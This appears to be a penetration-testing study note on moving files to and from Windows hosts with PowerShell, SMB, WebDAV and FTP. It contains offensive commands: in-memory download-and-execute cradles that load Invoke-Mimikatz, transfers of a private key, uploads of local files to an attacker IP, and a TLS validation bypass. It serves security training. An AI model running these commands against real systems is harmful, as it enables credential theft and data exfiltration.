# Windows File Transfer Methods

## Introduction

The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised.

The term "fileless" suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. The file is not "present" on the system but runs in memory.

## Download Operations

### PowerShell Base64 Encode & Decode

Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content.

**Check MD5 Hash on Linux:**
```bash
md5sum id_rsa
# Output: 4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Encode File to Base64 on Linux:**
```bash
cat id_rsa | base64 -w 0; echo
# Output: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
```

**Decode Base64 on Windows:**
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K..."))
```

**Verify MD5 Hash on Windows:**
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

**⚠️ Note:** Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

### PowerShell Web Downloads

Most companies allow HTTP and HTTPS outbound traffic through the firewall. PowerShell offers many file transfer options using the `System.Net.WebClient` class.

**WebClient Methods:**
- `OpenRead` - Returns data from resource as Stream
- `OpenReadAsync` - Returns data without blocking calling thread
- `DownloadData` - Downloads data and returns Byte array
- `DownloadDataAsync` - Downloads data without blocking calling thread
- `DownloadFile` - Downloads data to local file
- `DownloadFileAsync` - Downloads data to local file without blocking
- `DownloadString` - Downloads String from resource
- `DownloadStringAsync` - Downloads String without blocking calling thread

**PowerShell DownloadFile Method:**
```powershell
# Synchronous download
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Asynchronous download
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

**PowerShell DownloadString - Fileless Method:**
```powershell
# Download and execute directly in memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Using pipeline
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

**PowerShell Invoke-WebRequest:**
```powershell
# Available from PowerShell 3.0 onwards (slower than WebClient)
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Using aliases
iwr https://example.com/file.txt -OutFile file.txt
curl https://example.com/file.txt -OutFile file.txt
wget https://example.com/file.txt -OutFile file.txt
```

**Common Errors and Solutions:**

1. **Internet Explorer Configuration Error:**
```powershell
# Error: Internet Explorer first-launch configuration not complete
# Solution: Use -UseBasicParsing parameter
Invoke-WebRequest https://example.com/file.txt -UseBasicParsing | IEX
```

2. **SSL/TLS Certificate Error:**
```powershell
# Bypass SSL certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

The Server Message Block protocol (SMB) runs on port TCP/445 and is common in enterprise networks.

**Create SMB Server on Linux:**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Download from SMB Server:**
```cmd
copy \\192.168.220.133\share\nc.exe
```

**For newer Windows versions (authenticated SMB):**
```bash
# Create SMB server with credentials
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
# Mount SMB share with credentials
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP Downloads

FTP uses ports TCP/21 and TCP/20 for file transfers.

**Setup FTP Server on Linux:**
```bash
# Install pyftpdlib
sudo pip3 install pyftpdlib

# Start FTP server
sudo python3 -m pyftpdlib --port 21
```

**Download via PowerShell:**
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

**Download via FTP Client (non-interactive):**
```cmd
# Create command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Execute FTP commands
ftp -v -n -s:ftpcommand.txt
```

## Upload Operations

### PowerShell Base64 Encode & Decode

**Encode File on Windows:**
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

**Get MD5 Hash on Windows:**
```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

**Decode Base64 on Linux:**
```bash
echo <base64_string> | base64 -d > hosts
md5sum hosts  # Verify hash
```

### PowerShell Web Uploads

PowerShell doesn't have a built-in upload function, but we can use `Invoke-WebRequest` or `Invoke-RestMethod`.

**Setup Upload Server on Linux:**
```bash
# Install uploadserver
pip3 install uploadserver

# Start upload server
python3 -m uploadserver
# File upload available at /upload on port 8000
```

**Upload via PowerShell Script:**
```powershell
# Download and use PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**Base64 Web Upload:**
```powershell
# Encode and POST via web request
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

**Catch with Netcat:**
```bash
nc -lvnp 8000
# Then decode the base64 content
echo <base64_content> | base64 -d -w 0 > hosts
```

### SMB Uploads

Companies usually allow outbound HTTP/HTTPS but block SMB (TCP/445). Alternative is to run SMB over HTTP with WebDAV.

**WebDAV Setup:**
```bash
# Install WebDAV modules
sudo pip3 install wsgidav cheroot

# Start WebDAV server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Connect to WebDAV Share:**
```cmd
# Connect to WebDAV
dir \\192.168.49.128\DavWWWRoot

# Upload files
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

**⚠️ Note:** `DavWWWRoot` is a special keyword recognized by Windows Shell for WebDAV root connection.

### FTP Uploads

**Setup FTP Server with Write Access:**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**Upload via PowerShell:**
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**Upload via FTP Client:**
```cmd
# Create upload command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Execute upload
ftp -v -n -s:ftpcommand.txt
```

## Key Takeaways

1. **PowerShell** is the most versatile tool for file transfers on Windows
2. **Base64 encoding** is useful for small files and bypassing restrictions
3. **SMB** is fast but often blocked by firewalls
4. **HTTP/HTTPS** methods are most likely to work due to firewall policies
5. **WebDAV** provides SMB-like functionality over HTTP
6. **FTP** is reliable but may require firewall configuration
7. Always verify file integrity with hash comparisons
8. Consider "fileless" methods that execute directly in memory

## References

- [PowerShell Download Cradles by Harmj0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- [Microsoft - Preventing SMB traffic](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/prevent-smb-traffic)
- [WebDAV RFC 4918](https://tools.ietf.org/html/rfc4918) 